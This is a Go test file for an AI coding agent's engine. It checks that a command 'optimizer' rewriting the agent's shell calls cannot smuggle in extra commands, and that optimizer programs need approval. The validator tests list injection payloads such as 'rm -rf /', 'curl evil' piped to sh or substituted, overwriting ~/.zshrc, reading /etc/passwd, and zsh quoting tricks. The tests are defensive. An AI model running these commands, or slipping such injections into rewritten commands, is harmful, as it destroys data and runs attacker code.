package engine

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/FinanceNik/Freeloop/internal/config"
	"github.com/FinanceNik/Freeloop/internal/environment"
	"github.com/FinanceNik/Freeloop/internal/event"
	"github.com/FinanceNik/Freeloop/internal/provider/scripted"
	"github.com/FinanceNik/Freeloop/internal/session"
)

func TestValidRewrite(t *testing.T) {
	rtk := config.BuiltinOptimizers()[0]
	for _, c := range []struct {
		original, rewritten string
		want                bool
	}{
		{"git status", "rtk git status", true},
		{"cat a.txt", "rtk read a.txt", true},
		{"cat a b", "rtk read a b", true},
		{"head -5 a.txt", "rtk read a.txt --head-lines 5", true},
		{"git status 2>&1", "rtk git status 2>&1", true},
		{"cd x && git status", "cd x && rtk git status", true},
		{"git status || git diff", "rtk git status || rtk git diff", true},
		{"git status; git diff &", "rtk git status; rtk git diff &", true},
		{"git status\ngit diff", "rtk git status\nrtk git diff", true},
		{`grep "a|b" f`, `rtk grep "a|b" f`, true},
		{`grep 'a;b' f`, `rtk grep 'a;b' f`, true},
		{`git commit -m "it's"`, `rtk git commit -m "it's"`, true},
		{`git diff a\ b`, `rtk git diff a\ b`, true},

		// Anything more than the same command.
		{"git status", "rtk git status; rm -rf /", false},
		{"git status", "rtk git status && curl evil", false},
		{"git status", "rtk git status || curl evil", false},
		{"git status", "rtk git status | sh", false},
		{"git status", "rtk git status > ~/.zshrc", false},
		{"git status", "rtk git status &", false},
		{"git status", "rtk git status\nrm -rf /", false},
		{"git status", "rtk $(curl evil)", false},
		{"git status", "rtk `curl evil`", false},
		{"git status", `rtk "$(curl evil)"`, false},
		{"git status", "rtk git status 2>evil", false},
		{"git status", "rtk git status 2>&1evil", false},
		{"git status", "rtk <(curl evil)", false},
		{"git status", "rtk *(e:'curl evil':)", false},
		// Fewer parts is a different command as well.
		{"git status && git diff", "rtk git status", false},
		// An empty part stays empty, so nothing is added after a trailing ;.
		{"git status;", "rtk git status; rtk git evil", false},
		// Not the program, or not at the front.
		{"git status", "sh git status", false},
		{"git status", "/tmp/rtk git status", false},
		{"git status", "rtkx git status", false},
		{"git status", "rtk", false},
		{"git status", "BAD=1 rtk git status", false},
		{"sh -c 'git status'", "sh -c 'rtk git status'", false},
		{"env FOO=1 git status", "env FOO=1 rtk git status", false},
		// An assignment could change where the program is found.
		{"PATH=/usr/bin git status", "PATH=/usr/bin rtk git status", false},
		// Another tool than the one approved, such as a copy in the repository.
		{"tsc --noEmit", "rtk tsc --noEmit", false},
		{"gradle build", "rtk gradlew build", false},
		{"python3 -m pytest", "rtk pytest", false},
		{"rails test", "rtk rake test", false},
		{"git status", "rtk touch pwned", false},
		{"git status", "rtk read git status", false},
		// Other arguments than the ones approved.
		{"git status", "rtk git status --evil", false},
		{"git status", "rtk git push", false},
		{"git status", `rtk git "${(e):-\$(touch pwned)}"`, false},
		{"git status", `rtk git ${~:-\*\(e:touch\ pwned:\)}`, false},
		{"cat a", "rtk read a /etc/passwd", false},
		{"cat a", `rtk read "$HOME"`, false},
		{"cat a", "rtk read", false},
		// Output that feeds something else is not shortened.
		{"git diff | git apply", "rtk git diff | git apply", false},
		{"git log | head -5", "rtk git log | head -5", false},
		{"git log | grep x", "git log | rtk grep x", false},
		{"git diff > p.diff", "rtk git diff > p.diff", false},
		{"cat a > b", "cat a > rtk evil", false},
		{"echo $(git status)", "echo $(rtk git status)", false},
		// Shapes zsh reads differently from a simple quote scan; the first two
		// ran the hidden command when tried, the third does under RC_QUOTES.
		{"git status", `rtk $'a\''; touch pwned; $'b\''`, false},
		{"git status", "rtk x #'\ntouch pwned\n#'", false},
		{"git status", "rtk 'a''; touch pwned; ''", false},
		// Not something the shell can be sure about.
		{"git status", "rtk git 'status", false},
		{"git 'status", "rtk git 'status", false},
		{"git status", "", false},
		{"git status", "rtk git\x00status", false},
	} {
		if got := validRewrite(c.original, c.rewritten, rtk); got != c.want {
			t.Errorf("validRewrite(%q, %q) = %v", c.original, c.rewritten, got)
		}
	}
}

// HRN-019: a line the check would refuse, a tool it may not rewrite, or something
// the program changes the meaning of, never reaches the program.
func TestRewritable(t *testing.T) {
	o := config.BuiltinOptimizers()[0]
	for cmd, want := range map[string]bool{
		"git status":                 true,
		"git diff --stat":            true,
		"cd x && go test ./...":      true,
		"git diff --output=p.diff":   false,
		"git diff --output p.diff":   false,
		`git diff '--output=p.diff'`: false,
		"git diff --output-file=x":   false,
		"git diff | git apply":       false,
		"git diff > x":               false,
		"git log":                    false,
		"git log -5":                 false,
		"git -C sub log":             false,
		"git status && git log":      false,
		"tsc --noEmit":               false,
		"npm test":                   false,
		"gradle build":               false,
		"python3 -m pytest":          false,
		"./git status":               false,
		"PATH=/usr/bin git status":   false,
		strings.Repeat("a", 70<<10):  false,
	} {
		if got := rewritable(cmd, o); got != want {
			t.Errorf("rewritable(%.40q) = %v", cmd, got)
		}
	}
}

// fakeOptimizer is an optimizer whose program is a stand-in with a name nothing
// else on the PATH has: it rewrites what the real one does, and a few commands
// badly on purpose, and logs its environment.
func fakeOptimizer(t *testing.T, e *Engine) (logFile string) {
	t.Helper()
	dir := t.TempDir()
	logFile = filepath.Join(dir, "log")
	script := `#!/bin/sh
echo "$* HOME=$HOME CWD=$PWD TELEMETRY=$FAKE_OPTIMIZER_TELEMETRY DB=$FAKE_OPTIMIZER_DB" >> ` + logFile + `
case "$1" in
--version) echo "fake 9.9.9" ;;
rewrite)
  case "$2" in
  "git status") printf 'fake-optimizer git status'; exit 3 ;;
  "echo evil") printf 'fake-optimizer git status; touch evil'; exit 0 ;;
  "echo slow") sleep 5 ;;
  *) exit 1 ;;
  esac ;;
*) echo "[short] $*" ;;
esac
`
	if err := os.WriteFile(filepath.Join(dir, "fake-optimizer"), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}
	t.Setenv("PATH", dir+string(os.PathListSeparator)+os.Getenv("PATH"))
	e.optimizers = []config.Optimizer{{
		ID: "fake", Name: "Fake", Program: "fake-optimizer",
		Rewrite: []string{"rewrite"}, RewriteExits: []int{0, 3},
		Rewrites:     map[string]string{"git": "git", "echo": "echo"},
		ProbeCommand: "git status", ProbeWant: "fake-optimizer git status",
		Version: []string{"--version"},
		Env:     map[string]string{"FAKE_OPTIMIZER_TELEMETRY": "off"},
		DataEnv: map[string]string{"FAKE_OPTIMIZER_DB": "tracking.db"},
		Install: "brew install fake",
	}}
	return logFile
}

func shell(command string, extra ...string) scripted.Call {
	input := map[string]any{"command": command}
	for _, k := range extra {
		input[k] = true
	}
	return scripted.Call{Name: "shell", Input: input}
}

func scriptedSession(t *testing.T, e *Engine, root string, steps ...scripted.Step) string {
	t.Helper()
	e.mu.Lock()
	e.providers.built["a"] = &configuredProvider{cfg: config.Provider{ID: "a", Name: "a", Type: "scripted"}, p: scripted.New("a", steps...)}
	e.mu.Unlock()
	ses, err := e.CreateSession(context.Background(), CreateSessionRequest{ProjectRoot: root, ProviderID: "a", Model: "small"})
	if err != nil {
		t.Fatal(err)
	}
	return ses.ID
}

// outputs returns what each finished shell call ran, with its output.
func outputs(t *testing.T, e *Engine, sid string) []map[string]any {
	t.Helper()
	evs, err := e.Events(context.Background(), sid, 0)
	if err != nil {
		t.Fatal(err)
	}
	var out []map[string]any
	for _, ev := range evs {
		if ev.Type != event.ToolCallUpdate {
			continue
		}
		var d struct {
			Content []map[string]any `json:"content"`
		}
		json.Unmarshal(ev.Data, &d)
		for _, c := range d.Content {
			if c["type"] == "terminal_output" {
				out = append(out, c)
			}
		}
	}
	return out
}

// HRN-019: approval sees the command as the model wrote it, what runs is the
// rewrite, the switch applies at the next command and every doubtful rewrite
// runs the original.
func TestOptimizerRewritesApprovedCommands(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	logFile := fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	root := t.TempDir()
	sid := scriptedSession(t, e, root,
		scripted.Step{Calls: []scripted.Call{shell("git status")}},
		scripted.Step{Calls: []scripted.Call{shell("echo plain")}},
		scripted.Step{Calls: []scripted.Call{shell("echo evil")}},
		scripted.Step{Calls: []scripted.Call{shell("git status", "raw")}},
		scripted.Step{Text: "done"},
	)
	stop := make(chan struct{})
	defer close(stop)
	approveAll(e, stop)
	e.Prompt(ctx, sid, "first")
	waitIdle(t, ch, sid)

	// Listing runs nothing: another program can have the same name.
	os.Remove(logFile)
	list, err := e.Optimizers(ctx, sid)
	if err != nil || len(list) != 1 || !list[0].Available {
		t.Fatalf("Optimizers = %+v, %v", list, err)
	}
	if _, err := os.Stat(logFile); err == nil {
		t.Error("listing the optimizers ran the program")
	}
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "second")
	waitIdle(t, ch, sid)

	got := outputs(t, e, sid)
	if len(got) != 8 {
		t.Fatalf("%d shell calls: %+v", len(got), got)
	}
	for i := range 4 {
		if got[i]["via"] != nil {
			t.Errorf("rewritten while off: %+v", got[i])
		}
	}
	if got[4]["via"] != "Fake" || got[4]["command"] != "fake-optimizer git status" || !strings.Contains(got[4]["output"].(string), "[short] git status") {
		t.Errorf("not rewritten while on: %+v", got[4])
	}
	if got[5]["via"] != nil || !strings.Contains(got[5]["output"].(string), "plain") {
		t.Errorf("a command with no rewrite: %+v", got[5])
	}
	if got[6]["via"] != nil || !strings.Contains(got[6]["output"].(string), "evil") {
		t.Errorf("a rewrite that does more ran: %+v", got[6])
	}
	if _, err := os.Stat(filepath.Join(root, "evil")); err == nil {
		t.Error("the bad rewrite's second command ran")
	}
	if got[7]["via"] != nil {
		t.Errorf("raw was rewritten: %+v", got[7])
	}
	// Raw still finds the session's data; only the rewrite is skipped.
	so := &sessionOptimizer{e: e, sid: sid, env: mustLocal(t, e)}
	if rw := so.Rewrite(ctx, "git status", true); rw.Via != "" || rw.Command != "git status" || rw.Env["FAKE_OPTIMIZER_DB"] == "" {
		t.Errorf("raw: %+v", rw)
	}

	// The approval and the title keep the original; so does the record.
	evs, _ := e.Events(ctx, sid, 0)
	asked := 0
	for _, ev := range evs {
		if ev.Type == event.ToolCall && strings.Contains(string(ev.Data), "fake-optimizer") {
			t.Errorf("the tool call shows the rewrite: %s", ev.Data)
		}
		if ev.Type == event.PermissionRequested {
			asked++
			if strings.Contains(string(ev.Data), "fake-optimizer") {
				t.Errorf("the approval shows the rewrite: %s", ev.Data)
			}
		}
	}
	if asked != 8 {
		t.Errorf("%d approvals for 8 commands", asked)
	}
	if !slices.ContainsFunc(evs, func(ev event.Event) bool { return ev.Type == event.OptimizerChanged }) {
		t.Error("no optimizer_changed in the transcript")
	}
	if s, _ := e.store.GetSession(ctx, sid); s.Optimizer != "fake" {
		t.Errorf("session optimizer = %q", s.Optimizer)
	}

	// The rewrite reads no agent's settings; the command keeps its own home,
	// with the session's own data folder.
	log, _ := os.ReadFile(logFile)
	lines := strings.Split(string(log), "\n")
	rewrite := lines[slices.IndexFunc(lines, func(l string) bool { return strings.HasPrefix(l, "rewrite git status") })]
	if !strings.Contains(rewrite, "HOME=/nonexistent") || !strings.Contains(rewrite, "TELEMETRY=off") || !strings.Contains(rewrite, "CWD=/ ") {
		t.Errorf("rewrite ran with: %s", rewrite)
	}
	run := lines[slices.IndexFunc(lines, func(l string) bool { return strings.HasPrefix(l, "git status") })]
	if strings.Contains(run, "HOME=/nonexistent") || !strings.Contains(run, "TELEMETRY=off") || !strings.Contains(run, filepath.Join("optimizer", sid, "tracking.db")) {
		t.Errorf("the command ran with: %s", run)
	}

	// What it keeps is the session's alone, and goes with the session.
	ses, _ := e.store.GetSession(ctx, sid)
	dir := e.optimizerDir(ses, false)
	if fi, err := os.Stat(dir); err != nil || fi.Mode().Perm() != 0o700 {
		t.Errorf("data folder: %v, %v", fi, err)
	}

	if err := e.SetOptimizer(ctx, sid, ""); err != nil {
		t.Fatal(err)
	}
	if s, _ := e.store.GetSession(ctx, sid); s.Optimizer != "" {
		t.Errorf("session optimizer after off = %q", s.Optimizer)
	}
	if err := e.DeleteSession(ctx, sid); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(dir); err == nil {
		t.Error("the data folder outlives the session")
	}
}

// HRN-019: a program with the right name that does something else, and one that
// is missing, cannot be chosen.
func TestOptimizerRefusesWhatItCannotUse(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	ses, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: t.TempDir(), ProviderID: DemoProviderID})
	if err != nil {
		t.Fatal(err)
	}
	if err := e.SetOptimizer(ctx, ses.ID, "nope"); err == nil {
		t.Error("chose an unknown optimizer")
	}
	e.optimizers = append(e.optimizers, config.Optimizer{ID: "gone", Name: "Gone", Program: "freeloop-no-such-program", Install: "brew install gone"})
	list, err := e.Optimizers(ctx, ses.ID)
	if err != nil || len(list) != 2 || list[1].Available || !strings.Contains(list[1].Reason, "brew install gone") {
		t.Errorf("Optimizers = %+v, %v", list, err)
	}
	e.optimizers[0].ProbeWant = "something else"
	if err := e.SetOptimizer(ctx, ses.ID, "fake"); err == nil || !strings.Contains(err.Error(), "another program") {
		t.Errorf("another program: %v", err)
	}
	e.optimizers[0].Program = "freeloop-no-such-program"
	if err := e.SetOptimizer(ctx, ses.ID, "fake"); err == nil || !strings.Contains(err.Error(), "brew install fake") {
		t.Errorf("missing program: %v", err)
	}
	if s, _ := e.store.GetSession(ctx, ses.ID); s.Optimizer != "" {
		t.Errorf("session optimizer = %q", s.Optimizer)
	}
}

// HRN-019: a rewrite that hangs costs its time limit and no more; the command
// runs, and the user hears about it once.
func TestOptimizerFailureRunsTheOriginal(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	sid := scriptedSession(t, e, t.TempDir(),
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Text: "done"},
	)
	stop := make(chan struct{})
	defer close(stop)
	approveAll(e, stop)
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "go")
	waitIdle(t, ch, sid)
	got := outputs(t, e, sid)
	if len(got) != 2 || got[0]["via"] != nil || !strings.Contains(got[0]["output"].(string), "slow") {
		t.Fatalf("shell calls: %+v", got)
	}
	evs, _ := e.Events(ctx, sid, 0)
	notices := 0
	for _, ev := range evs {
		if ev.Type == event.Notice && strings.Contains(string(ev.Data), "without Fake") {
			notices++
		}
	}
	if notices != 1 {
		t.Errorf("%d notices", notices)
	}
}

// HRN-019: subagents and forks keep the session's optimizer.
func TestOptimizerInheritance(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	sid := scriptedSession(t, e, t.TempDir(), scripted.Step{Text: "done"})
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "one")
	waitIdle(t, ch, sid)
	evs, _ := e.Events(ctx, sid, 0)
	i := slices.IndexFunc(evs, func(ev event.Event) bool { return ev.Type == event.UserMessageChunk })
	fork, err := e.ForkSession(ctx, sid, evs[i].Seq)
	if err != nil {
		t.Fatal(err)
	}
	if fork.Session.Optimizer != "fake" {
		t.Errorf("fork has %q", fork.Session.Optimizer)
	}
	child, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: t.TempDir(), ProviderID: "a", Model: "small", parent: sid, optimizer: "fake"})
	if err != nil || child.Optimizer != "fake" {
		t.Errorf("child has %q, %v", child.Optimizer, err)
	}
}

// HRN-019: a new session takes what it is asked for, then its profile's, then
// the default in Settings; off beats them, and nothing it inherits fails it.
func TestOptimizerDefaults(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	e := openTest(t, dir)
	defer e.Close()
	fakeOptimizer(t, e)
	os.MkdirAll(filepath.Join(dir, config.ProfilesDir), 0o700)
	write := func(id, body string) {
		t.Helper()
		if err := os.WriteFile(filepath.Join(dir, config.ProfilesDir, id+".yaml"), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	write("plain", "name: Plain\n")
	write("short", "name: Short\noptimizer: fake\n")
	write("raw", "name: Raw\noptimizer: off\n")
	write("gone", "name: Gone\noptimizer: missing\n")
	e.loadProfiles()
	root := t.TempDir()
	start := func(req CreateSessionRequest) (string, error) {
		req.ProjectRoot, req.ProviderID = root, DemoProviderID
		ses, err := e.CreateSession(ctx, req)
		return ses.Optimizer, err
	}
	want := func(name string, req CreateSessionRequest, optimizer string) {
		t.Helper()
		got, err := start(req)
		if err != nil || got != optimizer {
			t.Errorf("%s: %q, %v; want %q", name, got, err, optimizer)
		}
	}
	want("nothing set", CreateSessionRequest{}, "")
	want("a profile's", CreateSessionRequest{ProfileID: "short"}, "fake")
	want("asked for", CreateSessionRequest{Optimizer: "fake"}, "fake")
	want("a profile's that is gone starts anyway", CreateSessionRequest{ProfileID: "gone"}, "missing")

	if _, err := e.SetDefaultOptimizer(ctx, "fake"); err != nil {
		t.Fatal(err)
	}
	want("the default", CreateSessionRequest{}, "fake")
	want("a profile without one", CreateSessionRequest{ProfileID: "plain"}, "fake")
	want("a profile that says off", CreateSessionRequest{ProfileID: "raw"}, "")
	want("off beats the default", CreateSessionRequest{Optimizer: config.OptimizerOff}, "")

	// What a session inherits is what it has, off included.
	child, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: root, ProviderID: DemoProviderID, optimizer: config.OptimizerOff})
	if err != nil || child.Optimizer != "" {
		t.Errorf("an off parent's child has %q, %v", child.Optimizer, err)
	}

	// Asking for one that cannot run fails, before there is a session.
	if _, err := start(CreateSessionRequest{Optimizer: "missing"}); err == nil {
		t.Error("asked for an unknown optimizer and got a session")
	}
	e.optimizers[0].Program = "freeloop-no-such-program"
	if _, err := start(CreateSessionRequest{Optimizer: "fake"}); err == nil || !strings.Contains(err.Error(), "brew install fake") {
		t.Errorf("asked for a missing program: %v", err)
	}
	if _, err := e.SetDefaultOptimizer(ctx, "fake"); err == nil {
		t.Error("a program that is missing became the default")
	}
	// The default that stopped working still starts sessions; the first command
	// says so.
	want("a default that stopped working", CreateSessionRequest{}, "fake")

	if c, err := e.SetDefaultOptimizer(ctx, config.OptimizerOff); err != nil || c.Defaults.Optimizer != "" {
		t.Errorf("default off: %q, %v", c.Defaults.Optimizer, err)
	}
}

// HRN-019: listing runs nothing, a check runs the program, and a file in
// optimizers/ is picked up when it changes.
func TestOptimizerStatusAndFiles(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	e := openTest(t, dir)
	defer e.Close()
	logFile := fakeOptimizer(t, e)
	list := e.ListOptimizers(ctx)
	if len(list) != 1 || !strings.HasSuffix(list[0].Path, "/fake-optimizer") || list[0].Install != "brew install fake" {
		t.Fatalf("ListOptimizers = %+v", list)
	}
	if _, err := os.Stat(logFile); err == nil {
		t.Error("listing ran the program")
	}
	c, err := e.CheckOptimizer(ctx, "fake")
	if err != nil || !c.OK || c.Version != "fake 9.9.9" || c.Path != list[0].Path {
		t.Errorf("CheckOptimizer = %+v, %v", c, err)
	}

	os.MkdirAll(filepath.Join(dir, config.OptimizersDir), 0o700)
	file := filepath.Join(config.OptimizersDir, "other.yaml")
	os.WriteFile(filepath.Join(dir, file), []byte("name: Other\nprogram: other-optimizer\nrewrite: [r]\nrewriteExits: [0]\nrewrites: {git: git}\nprobeCommand: git status\nprobeWant: other-optimizer git status\n"), 0o600)
	os.WriteFile(filepath.Join(dir, config.OptimizersDir, "bad.yaml"), []byte("name: Bad\n"), 0o600)
	e.reload([]string{file})
	if _, ok := e.findOptimizer("other"); !ok {
		t.Error("the file was not picked up")
	}
	if !slices.ContainsFunc(e.ConfigIssues(), func(i config.Issue) bool { return strings.Contains(i.File, "bad.yaml") }) {
		t.Errorf("the bad file is not reported: %+v", e.ConfigIssues())
	}
}

// HRN-019: the install command is typed for the user to read; nothing runs it.
func TestOptimizerInstallIsOnlyTyped(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	marker := filepath.Join(t.TempDir(), "installed")
	e.optimizers[0].Install = "touch " + marker
	ses, _ := demoSession(t, e, "s", "ask")
	info, err := e.TypeOptimizerInstall(ctx, ses.ID, "fake")
	if err != nil {
		t.Fatal(err)
	}
	defer e.CloseTerminal(info.ID)
	deadline := time.Now().Add(10 * time.Second)
	for {
		out, err := e.TerminalScreen(info.ID)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(out.Data), "installed") {
			break
		}
		if time.Now().After(deadline) {
			t.Fatalf("not typed: %q", out.Data)
		}
		time.Sleep(50 * time.Millisecond)
	}
	time.Sleep(300 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Error("the install command ran")
	}
}

// HRN-019: a file's optimizer runs only once the user approved it as it is; a
// planted one, as from a backup that also makes it the default, runs nothing.
func TestOptimizerFileNeedsApproval(t *testing.T) {
	ctx := context.Background()
	dir := t.TempDir()
	e := openTest(t, dir)
	defer e.Close()
	logFile := fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	os.MkdirAll(filepath.Join(dir, config.OptimizersDir), 0o700)
	file := filepath.Join(dir, config.OptimizersDir, "fake.yaml")
	body := "name: Fake\nprogram: fake-optimizer\nrewrite: [rewrite]\nrewriteExits: [0, 3]\nrewrites: {git: git}\nprobeCommand: git status\nprobeWant: fake-optimizer git status\ninstall: brew install fake\n"
	os.WriteFile(file, []byte(body), 0o600)
	e.loadOptimizers()
	c := e.Config()
	c.Defaults.Optimizer = "fake"
	if _, err := e.SaveSettings(c); err != nil {
		t.Fatal(err)
	}
	sid := scriptedSession(t, e, t.TempDir(), scripted.Step{Calls: []scripted.Call{shell("git status")}}, scripted.Step{Text: "done"})
	stop := make(chan struct{})
	defer close(stop)
	approveAll(e, stop)
	if ses, _ := e.store.GetSession(ctx, sid); ses.Optimizer != "fake" {
		t.Fatalf("the default did not apply: %q", ses.Optimizer)
	}
	if c, _ := e.CheckOptimizer(ctx, "fake"); c.OK || !strings.Contains(c.Reason, "approved") {
		t.Errorf("checked a file not approved: %+v", c)
	}
	if _, err := e.TypeOptimizerInstall(ctx, sid, "fake"); err == nil {
		t.Error("typed the install command of a file not approved")
	}
	if _, err := e.CreateSession(ctx, CreateSessionRequest{ProjectRoot: t.TempDir(), ProviderID: DemoProviderID, Optimizer: "fake"}); err == nil {
		t.Error("asked for a file not approved and got a session")
	}
	// A session that inherited it runs its commands as they are, and says so.
	e.Prompt(ctx, sid, "go")
	waitIdle(t, ch, sid)
	if got := outputs(t, e, sid); len(got) != 1 || got[0]["via"] != nil {
		t.Errorf("shell calls: %+v", got)
	}
	if _, err := os.Stat(logFile); err == nil {
		t.Error("the program ran before it was approved")
	}
	evs, _ := e.Events(ctx, sid, 0)
	if !slices.ContainsFunc(evs, func(ev event.Event) bool {
		return ev.Type == event.Notice && strings.Contains(string(ev.Data), "not been approved")
	}) {
		t.Error("no notice about the approval")
	}
	if err := e.SetOptimizer(ctx, sid, ""); err != nil {
		t.Fatal(err)
	}
	if err := e.SetOptimizer(ctx, sid, "fake"); err == nil || !strings.Contains(err.Error(), "approved") {
		t.Errorf("chose a file not approved: %v", err)
	}

	st := e.ListOptimizers(ctx)
	i := slices.IndexFunc(st, func(o OptimizerStatus) bool { return o.ID == "fake" })
	if i < 0 || !st[i].NeedsApproval || !strings.Contains(st[i].Runs, "fake-optimizer rewrite") {
		t.Fatalf("status: %+v", st)
	}
	if _, err := e.ApproveOptimizer(ctx, "fake", "not what was shown"); err == nil {
		t.Error("approved something other than what was shown")
	}
	if _, err := e.ApproveOptimizer(ctx, "fake", st[i].Fingerprint); err != nil {
		t.Fatal(err)
	}
	if c, _ := e.CheckOptimizer(ctx, "fake"); !c.OK {
		t.Errorf("checked after approval: %+v", c)
	}
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Errorf("chose it after approval: %v", err)
	}

	// Any change to the file ends the approval.
	os.WriteFile(file, []byte(strings.Replace(body, "rewrite: [rewrite]", "rewrite: [rewrite, --evil]", 1)), 0o600)
	e.loadOptimizers()
	if c, _ := e.CheckOptimizer(ctx, "fake"); c.OK {
		t.Error("an edited file kept its approval")
	}
}

// HRN-019: a program inside the project is the repository's choice, and is not
// run even when the PATH leads to it.
func TestOptimizerRefusesAProgramInTheProject(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	root := environment.Canonical(t.TempDir())
	marker := filepath.Join(root, "ran")
	os.MkdirAll(filepath.Join(root, "bin"), 0o755)
	os.WriteFile(filepath.Join(root, "bin", "fake-optimizer"), []byte("#!/bin/sh\ntouch "+marker+"\n"), 0o755)
	t.Setenv("PATH", filepath.Join(root, "bin")+string(os.PathListSeparator)+os.Getenv("PATH"))
	env, err := e.localEnv(root, nil)
	if err != nil {
		t.Fatal(err)
	}
	if path := locateProgram(ctx, env, "fake-optimizer"); !env.Contains(path) {
		t.Skipf("the login shell's PATH did not lead to it: %s", path)
	}
	p := e.probeOptimizer(ctx, env, e.optimizers[0], true)
	if !strings.Contains(p.reason, "inside the project") {
		t.Errorf("probe: %+v", p)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Error("it ran")
	}
}

// HRN-019: one that hangs costs its time limit once, not on every command.
func TestOptimizerHangIsNotRepeated(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	logFile := fakeOptimizer(t, e)
	ch, cancel := e.Subscribe()
	defer cancel()
	sid := scriptedSession(t, e, t.TempDir(),
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Calls: []scripted.Call{shell("echo slow")}},
		scripted.Step{Text: "done"},
	)
	stop := make(chan struct{})
	defer close(stop)
	approveAll(e, stop)
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	e.Prompt(ctx, sid, "go")
	waitIdle(t, ch, sid)
	if got := outputs(t, e, sid); len(got) != 3 {
		t.Fatalf("shell calls: %+v", got)
	}
	log, _ := os.ReadFile(logFile)
	if n := strings.Count(string(log), "rewrite echo slow"); n != 1 {
		t.Errorf("asked %d times", n)
	}
}

// HRN-019: what an unconfined session's commands kept is out of a sandboxed
// session's reach.
func TestOptimizerDataIsApartFromTheSandbox(t *testing.T) {
	e := openTest(t, t.TempDir())
	defer e.Close()
	ses := session.Session{ID: "ses_1", ProjectID: "prj_1"}
	free, boxed := e.optimizerDir(ses, false), e.optimizerDir(ses, true)
	if strings.HasPrefix(free, e.projectCache(ses.ProjectID)) {
		t.Errorf("an unconfined session's data is in the sandbox's caches: %s", free)
	}
	if !strings.HasPrefix(boxed, filepath.Join(e.projectCache(ses.ProjectID), "cache")) {
		t.Errorf("a sandboxed session's data is out of its reach: %s", boxed)
	}
}

// HRN-019: a stop while it is being looked for says nothing about the program.
func TestOptimizerStopIsNotAFailure(t *testing.T) {
	ctx := context.Background()
	e := openTest(t, t.TempDir())
	defer e.Close()
	fakeOptimizer(t, e)
	sid := scriptedSession(t, e, t.TempDir(), scripted.Step{Text: "done"})
	if err := e.SetOptimizer(ctx, sid, "fake"); err != nil {
		t.Fatal(err)
	}
	so := &sessionOptimizer{e: e, sid: sid, env: mustLocal(t, e)}
	stopped, cancel := context.WithCancel(ctx)
	cancel()
	if rw := so.Rewrite(stopped, "git status", false); rw.Via != "" {
		t.Errorf("rewrote while stopped: %+v", rw)
	}
	if len(so.warned) != 0 {
		t.Errorf("warned: %v", so.warned)
	}
	if rw := so.Rewrite(ctx, "git status", false); rw.Via != "Fake" {
		t.Errorf("the next command was not rewritten: %+v", rw)
	}
}

func mustLocal(t *testing.T, e *Engine) environment.Environment {
	t.Helper()
	env, err := e.localEnv(t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}
	return env
}
